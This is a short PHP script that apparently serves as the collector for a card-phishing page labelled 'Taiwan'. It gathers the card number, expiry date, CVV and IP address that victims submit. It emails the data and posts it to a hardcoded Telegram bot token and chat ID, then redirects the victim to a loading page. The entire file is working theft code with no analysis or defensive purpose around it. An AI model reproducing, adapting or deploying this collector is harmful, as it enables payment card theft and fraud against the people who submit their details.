<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "***************Taiwan***************\n";
$bilsmg .= "cc: ".$_POST['Ecom_Payment_Card_Number']."\n";
$bilsmg .= "EXP: ".$_POST['Ecom_Payment_Card_ExpDate_Month']."-".$_POST['Ecom_Payment_Card_ExpDate_Year']."\n";
$bilsmg .= "CVV:   ".$_POST['Ecom_Payment_Card_Verification']."\n";
$bilsmg .= "IP  : $ip | $hostname\n";
$bilsmg .= "***************Taiwan***************\n";

$bilsnd = "/";
$bilsub = "Taiwan | $ip";
$bilhead = "From: Taiwan <info2@mail.de>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);


$token = "5087127678:AAHzt6oQZgBatuoVSgLaChM1Z3qPXIt23d4";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=2120272098&text=" . urlencode($bilsmg)."" );

header("Location: loading.html");
?>